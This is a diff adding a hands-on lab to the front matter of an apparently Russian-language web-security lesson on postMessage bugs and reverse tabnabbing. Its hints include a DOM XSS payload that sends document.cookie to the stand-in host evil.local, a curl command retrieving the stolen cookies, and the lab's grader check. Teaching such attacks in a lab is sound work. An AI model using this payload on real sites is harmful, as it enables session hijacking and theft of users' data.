@@ -12,6 +12,19 @@ useful_for:
   - "Bug bounty"
 estimated_minutes: 45
 summary: "Как ошибки в postMessage и reverse tabnabbing позволяют перехватить окно жертвы, подменить страницу и украсть данные."
+lab:
+  kind: shell
+  title: "Практика: DOM XSS через postMessage без проверки origin"
+  toolset: [core, curl]
+  workdir: /home/student/task
+  files: [task.md, widget.js]
+  check: "grep -q 'postMessage' exploit.html && grep -q 'nto{' found.txt"
+  hints:
+    - "Прочитай widget.js: обработчик message пишет e.data в innerHTML и НЕ проверяет e.origin."
+    - "Собери exploit.html: iframe на victim.com/widget и postMessage с payload."
+    - "Payload: <img src=x onerror=fetch('https://evil.local/?c='+document.cookie)>"
+    - "Забери перехваченное: curl -s 'https://evil.local/steal' > found.txt"
+
 ---
 
 ## Вопрос, с которого всё начинается
